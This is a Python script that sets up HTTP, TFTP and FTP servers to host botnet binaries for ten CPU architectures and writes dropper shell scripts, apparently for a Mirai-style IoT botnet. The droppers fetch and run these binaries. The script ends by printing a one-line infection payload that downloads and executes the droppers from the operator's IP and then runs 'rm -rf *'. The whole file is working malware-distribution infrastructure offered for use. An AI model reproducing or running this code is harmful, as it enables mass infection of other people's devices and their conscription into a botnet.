import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "SSH"
bin_prefix = "xd."
bin_directory = "d"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("Setting up HTTP TFTP and FTP for your payload")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/sensi.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sensi.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sensi.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/sensi2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sensi2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sensi2.sh')
run('echo "#!/bin/bash" > /var/www/html/sensi.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sensi2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sensi2.sh')
run('echo "#!/bin/bash" > /var/ftp/sensi1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/sensi1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/sensi1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/sensi.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/sensi1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/sensi.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/sensi2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run('clear')
print("")
print("")
print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sensi.sh; curl -O http://" + ip + "/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp " + ip + " -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g " + ip + "; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *\x1b[0m")
print("")
print("")
raw_input("		Payload Terminat")
print("")
print("")
print("")
print("")
run('figlet "WhiteHat By U.S.&R."')
